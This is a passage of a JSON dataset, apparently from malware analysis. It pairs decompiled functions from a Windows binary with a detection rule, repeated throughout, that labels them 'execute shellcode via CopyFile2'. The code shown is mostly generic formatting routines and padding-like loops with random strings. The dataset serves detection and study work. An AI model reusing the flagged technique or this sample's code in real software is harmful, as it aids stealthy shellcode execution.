        "decompiled_code": "\nuint __fastcall fcn.0040509c(uint *param_1)\n\n{\n    char *pcVar1;\n    uint16_t uVar2;\n    char cVar3;\n    uint *puVar4;\n    uint arg_18h;\n    uint arg_14h;\n    uint arg_10h;\n    uint32_t uVar5;\n    char *pcVar6;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar7;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    iVar7 = param_1[10];\n    if (iVar7 < 0) {\n        if ((*(param_1 + 0x32) == 0x61) || (*(param_1 + 0x32) == 0x41)) {\n            iVar7 = 0xd;\n        }\n        else {\n            iVar7 = 6;\n        }\n        param_1[10] = iVar7;\n    }\n    else if ((iVar7 == 0) && ((*(param_1 + 0x32) == 0x67 || (iVar7 = 0,  *(param_1 + 0x32) == 0x47)))) {\n        param_1[10] = 1;\n        iVar7 = 1;\n    }\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar3 = fcn.00404c50(iVar7 + 0x15d);\n    if (cVar3 == '\\0') {\n        iVar7 = fcn.004059cf();\n        param_1[10] = iVar7 + -0x15d;\n    }\n    puVar4 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar4 = param_1 + 0x10;\n    }\n    param_1[0xd] = puVar4;\n    param_1[5] = param_1[5] + 8;\n    var_8h = *(param_1[5] + -8);\n    var_4h = *(param_1[5] + -4);\n    arg_18h = fcn.004059cf();\n    puVar4 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar4 = param_1 + 0x10;\n    }\n    iVar7 = *(param_1 + 0x32);\n    arg_30h = 1;\n    arg_2ch = param_1[2];\n    noname_8 = param_1[1];\n    arg_24h = *param_1;\n    arg_20h = param_1[10];\n    arg_14h = fcn.0040312f();\n    arg_10h = fcn.004059cf();\n    fcn.004041f6(&var_8h, puVar4, arg_10h, arg_14h, arg_18h, iVar7, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n    if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n        fcn.004022f2(param_1[0xd], param_1[2]);\n    }\n    uVar2 = *(param_1 + 0x32);\n    uVar5 = uVar2;\n    if (((uVar2 == 0x67) || (uVar2 == 0x47)) && (uVar5 = param_1[8] >> 5,  (uVar5 & 1) == 0)) {\n        uVar5 = fcn.00405bf5(param_1[0xd], param_1[2]);\n    }\n    pcVar6 = param_1[0xd];\n    cVar3 = *pcVar6;\n    uVar5 = uVar5 & 0xffffff00;\n    if (cVar3 == '-') {\n        param_1[8] = param_1[8] | 0x40;\n        pcVar6 = pcVar6 + 1;\n        param_1[0xd] = pcVar6;\n        cVar3 = *pcVar6;\n    }\n    if (((cVar3 == 'i') || (cVar3 == 'I')) || ((cVar3 == 'n' || (cVar3 == 'N')))) {\n        param_1[8] = param_1[8] & 0xfffffff7;\n        uVar5 = 0;\n        *(param_1 + 0x32) = 0x73;\n    }\n    pcVar1 = pcVar6 + 1;\n    do {\n        cVar3 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar3 != '\\0');\n    param_1[0xe] = pcVar6 - pcVar1;\n    return CONCAT31(uVar5 >> 8, 1);\n}\n",
        "token_count": 1162
    },
    "00405128": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405128(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403b57();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        uVar3 = arg_8h % arg_ch + 0x30 & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_10h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 396
    },
    "00405155": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00405155(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450700;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"hvysqgznyvgtyvfihbdbkvnjemd\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 1;\n}\n",
        "token_count": 174
    },
    "004051eb": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004051eb(uint *param_1)\n\n{\n    char *pcVar1;\n    uint16_t uVar2;\n    char cVar3;\n    uint *puVar4;\n    uint arg_18h;\n    uint arg_14h;\n    uint arg_10h;\n    uint32_t uVar5;\n    char *pcVar6;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar7;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    iVar7 = param_1[10];\n    if (iVar7 < 0) {\n        if ((*(param_1 + 0x32) == 0x61) || (*(param_1 + 0x32) == 0x41)) {\n            iVar7 = 0xd;\n        }\n        else {\n            iVar7 = 6;\n        }\n        param_1[10] = iVar7;\n    }\n    else if ((iVar7 == 0) && ((*(param_1 + 0x32) == 0x67 || (iVar7 = 0,  *(param_1 + 0x32) == 0x47)))) {\n        param_1[10] = 1;\n        iVar7 = 1;\n    }\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar3 = fcn.00404c50(iVar7 + 0x15d);\n    if (cVar3 == '\\0') {\n        iVar7 = fcn.004059cf();\n        param_1[10] = iVar7 + -0x15d;\n    }\n    puVar4 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar4 = param_1 + 0x10;\n    }\n    param_1[0xd] = puVar4;\n    param_1[5] = param_1[5] + 8;\n    var_8h = *(param_1[5] + -8);\n    var_4h = *(param_1[5] + -4);\n    arg_18h = fcn.004059cf();\n    puVar4 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar4 = param_1 + 0x10;\n    }\n    iVar7 = *(param_1 + 0x32);\n    arg_30h = 1;\n    arg_2ch = param_1[2];\n    noname_8 = param_1[1];\n    arg_24h = *param_1;\n    arg_20h = param_1[10];\n    arg_14h = fcn.0040312f();\n    arg_10h = fcn.004059cf();\n    fcn.004041f6(&var_8h, puVar4, arg_10h, arg_14h, arg_18h, iVar7, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n    if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n        fcn.004022f2(param_1[0xd], param_1[2]);\n    }\n    uVar2 = *(param_1 + 0x32);\n    uVar5 = uVar2;\n    if (((uVar2 == 0x67) || (uVar2 == 0x47)) && (uVar5 = param_1[8] >> 5,  (uVar5 & 1) == 0)) {\n        uVar5 = fcn.00405bf5(param_1[0xd], param_1[2]);\n    }\n    pcVar6 = param_1[0xd];\n    cVar3 = *pcVar6;\n    uVar5 = uVar5 & 0xffffff00;\n    if (cVar3 == '-') {\n        param_1[8] = param_1[8] | 0x40;\n        pcVar6 = pcVar6 + 1;\n        param_1[0xd] = pcVar6;\n        cVar3 = *pcVar6;\n    }\n    if (((cVar3 == 'i') || (cVar3 == 'I')) || ((cVar3 == 'n' || (cVar3 == 'N')))) {\n        param_1[8] = param_1[8] & 0xfffffff7;\n        uVar5 = 0;\n        *(param_1 + 0x32) = 0x73;\n    }\n    pcVar1 = pcVar6 + 1;\n    do {\n        cVar3 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar3 != '\\0');\n    param_1[0xe] = pcVar6 - pcVar1;\n    return CONCAT31(uVar5 >> 8, 1);\n}\n",
        "token_count": 1161
    },
    "004052cc": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004052cc(uint *param_1)\n\n{\n    char cVar1;\n    uint arg_10h;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t arg_14h;\n    uint arg_18h;\n    uint *var_4h;\n    \n    var_4h = param_1;\n    cVar1 = fcn.004047f5(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = param_1 + 0x10;\n        }\n        cVar1 = fcn.0040539e(puVar3);\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n        cVar1 = fcn.00406622();\n        if (cVar1 == '\\0') {\n            return 1;\n        }\n        param_1[0xe] = 1;\n    }\n    else {\n        var_4h = var_4h & 0xffff0000;\n        cVar1 = fcn.00402077(&var_4h);\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n        cVar1 = fcn.00406622();\n        if (cVar1 == '\\0') {\n            return 1;\n        }\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = param_1 + 0x10;\n        }\n        arg_18h = param_1[2];\n        arg_14h = var_4h;\n        arg_10h = fcn.004059cf();\n        iVar2 = fcn.00401f78(param_1 + 0xe, puVar3, arg_10h, arg_14h, arg_18h);\n        if (iVar2 != 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    puVar3 = param_1 + 0x10;\n    if (param_1[0x111] != NULL) {\n        puVar3 = param_1[0x111];\n    }\n    param_1[0xd] = puVar3;\n    return 1;\n}\n",
        "token_count": 547
    },
    "0040565f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040565f(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    char cVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.004059cf();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        cVar2 = arg_8h % arg_ch + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_10h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 380
    },
    "00405826": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.00405826(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450160;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"dyuejohvuyqsohjofetpogoyrieh\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x546ac4;\n}\n",
        "token_count": 173
    },
    "00405939": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405939(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint32_t arg_ch_00;\n    bool bVar6;\n    uint var_4h;\n    \n    iVar1 = fcn.00402798(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.00403a35();\n                *puVar2 = 0x16;\n                uVar3 = fcn.004037ce();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x004a5530;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x004a5530;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x004a5530:\n    uVar5 = *(in_ECX + 0x20);\n    if ((((uVar5 >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar6 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar6);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x20) = uVar5;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = uVar5 & 0xfffffff7;\n        fcn.00404c50(*(in_ECX + 0x28));\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    *(in_ECX + 0x3c) = 0;\n    if (iVar1 == 8) {\n        fcn.00403b7a(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.00405ad3(uVar3, arg_8h, arg_ch);\n    }\n    pcVar4 = *(in_ECX + 0x20) >> 7;\n    if (((pcVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (pcVar4 = *(in_ECX + 0x34),  *pcVar4 != '0')))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(pcVar4 >> 8, 1);\n}\n",
        "token_count": 1115
    },
    "004059f2": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004059f2(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint arg_14h;\n    uint arg_10h;\n    char *pcVar5;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar6;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar2 = fcn.00401023();\n    if (cVar2 == '\\0') {\ncode_r0x004a37b9:\n        uVar4 = 0;\n    }\n    else {\n        cVar2 = fcn.004051cd();\n        if (cVar2 != '\\0') {\n            iVar6 = param_1[10];\n            if (iVar6 < 0) {\n                if ((*(param_1 + 0x31) == 'a') || (*(param_1 + 0x31) == 'A')) {\n                    iVar6 = 0xd;\n                }\n                else {\n                    iVar6 = 6;\n                }\n                param_1[10] = iVar6;\n            }\n            else if ((iVar6 == 0) && ((*(param_1 + 0x31) == 'g' || (iVar6 = 0,  *(param_1 + 0x31) == 'G')))) {\n                param_1[10] = 1;\n                iVar6 = 1;\n            }\n            cVar2 = fcn.00404c50(iVar6 + 0x15d);\n            if (cVar2 == '\\0') {\n                iVar6 = fcn.004059cf();\n                param_1[10] = iVar6 + -0x15d;\n            }\n            puVar3 = param_1[0x111];\n            if (param_1[0x111] == NULL) {\n                puVar3 = param_1 + 0x10;\n            }\n            var_8h = NULL;\n            var_4h = NULL;\n            param_1[0xd] = puVar3;\n            cVar2 = fcn.00402fc2(&var_8h);\n            if (cVar2 == '\\0') goto code_r0x004a37b9;\n            uVar4 = fcn.004059cf();\n            puVar3 = param_1[0x111];\n            if (param_1[0x111] == NULL) {\n                puVar3 = param_1 + 0x10;\n            }\n            iVar6 = *(param_1 + 0x31);\n            arg_30h = 1;\n            arg_2ch = param_1[2];\n            noname_8 = param_1[1];\n            arg_24h = *param_1;\n            arg_20h = param_1[10];\n            arg_14h = fcn.0040312f();\n            arg_10h = fcn.004059cf();\n            fcn.004041f6(&var_8h, puVar3, arg_10h, arg_14h, uVar4, iVar6, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n            if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n                fcn.004022f2(param_1[0xd], param_1[2]);\n            }\n            if (((*(param_1 + 0x31) == 'g') || (*(param_1 + 0x31) == 'G')) && ((param_1[8] >> 5 & 1) == 0)) {\n                fcn.00405bf5(param_1[0xd], param_1[2]);\n            }\n            pcVar5 = param_1[0xd];\n            cVar2 = *pcVar5;\n            if (cVar2 == '-') {\n                param_1[8] = param_1[8] | 0x40;\n                pcVar5 = pcVar5 + 1;\n                param_1[0xd] = pcVar5;\n                cVar2 = *pcVar5;\n            }\n            if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n                param_1[8] = param_1[8] & 0xfffffff7;\n                *(param_1 + 0x31) = 0x73;\n            }\n            pcVar1 = pcVar5 + 1;\n            do {\n                cVar2 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            param_1[0xe] = pcVar5 - pcVar1;\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 1162
    },
    "00405ad3": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405ad3(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    char cVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.004059cf();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        cVar2 = arg_8h % arg_ch + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_10h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 380
    },
    "00405e4d": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl\nfcn.00405e4d(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h, uint noname_5, uint arg_20h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack188;\n    int32_t iStack184;\n    int32_t iStack180;\n    int32_t iStack176;\n    int32_t iStack172;\n    uchar auStack168 [24];\n    uchar auStack144 [24];\n    uint uStack120;\n    uint uStack116;\n    uchar uStack105;\n    uint uStack104;\n    uint uStack100;\n    uchar uStack93;\n    uchar uStack66;\n    uchar uStack65;\n    uint8_t uStack57;\n    ulong uStack56;\n    ulong uStack48;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff30;\n    uStack48 = CONCAT44(noname_5, arg_18h);\n    uStack56 = CONCAT44(noname_3, arg_10h);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x451020;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack57 = arg_ch & 1;\n    uStack65 = 0;\n    uStack66 = 0;\n    fcn.00401e79(\"rhxnbklgfnzgvmyvphmagmxtioaqhznxgupwwioetejbtmnachognfohprhcbicnfsoyipjeamzhiexoqefczpaohv\");\n    uStack93 = 1;\n    uStack100 = 0x40da4d40;\n    uStack104 = 0;\n    uStack105 = 0;\n    uStack116 = 0x40b03900;\n    uStack120 = 0;\n    uStack24 = 0;\n    fcn.00401e79(\"rhxnbklgfnzgvmyvphmagmxtioaqhznxgupwwioetejbtmnachognfohprhcbicnfsoyipjeamzhiexoqefczpaohv\");\n    uStack24 = 1;\n    fcn.00401e79(\"rhxnbklgfnzgvmyvphmagmxtioaqhznxgupwwioetejbtmnachognfohprhcbicnfsoyipjeamzhiexoqefczpaohv\");\n    uVar1 = fcn.004042dc(auStack168, auStack144);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack172 = 0x29; 0 < iStack172; iStack172 = iStack172 + -1) {\n        }\n    }\n    for (iStack176 = 0x32; 0 < iStack176; iStack176 = iStack176 + -1) {\n    }\n    for (iStack180 = 0x15; 0 < iStack180; iStack180 = iStack180 + -1) {\n    }\n    for (iStack184 = 0x11; 0 < iStack184; iStack184 = iStack184 + -1) {\n    }\n    for (iStack188 = 0xc; 0 < iStack188; iStack188 = iStack188 + -1) {\n    }\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 1;\n}\n",
        "token_count": 854
    },
    "00405efc": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405efc(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    char cVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.004059cf();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        cVar2 = arg_8h % arg_ch + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_10h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 380
    },
    "00405f83": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00405f83(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack132;\n    uchar auStack128 [24];\n    uchar auStack104 [48];\n    uint uStack56;\n    uint uStack52;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff58;\n    uStack28 = 0x450ae0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x652;\n    uStack52 = 0x40f0c530;\n    uStack56 = 0;\n    uStack24 = 3;\n    fcn.00401e79(\"xixqmzwrwsqvgneaicwqj\");\n    uStack24 = 4;\n    fcn.00401e79(\"xixqmzwrwsqvgneaicwqj\");\n    uStack24 = 5;\n    fcn.00401e79(\"xixqmzwrwsqvgneaicwqj\");\n    uVar1 = fcn.004042dc(auStack128, auStack104);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack132 = 0x62; 0 < iStack132; iStack132 = iStack132 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0xb453;\n}\n",
        "token_count": 445
    },
    "00406226": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406226(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403b57();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        uVar3 = extraout_ECX + 0x30U & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_14h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 454
    },
    "00406429": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.00406429(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x418210;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"tifdbtscmohfuyewtck\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x4ec2d4;\n}\n",
        "token_count": 169
    },
    "004064d3": {
        "rules": [
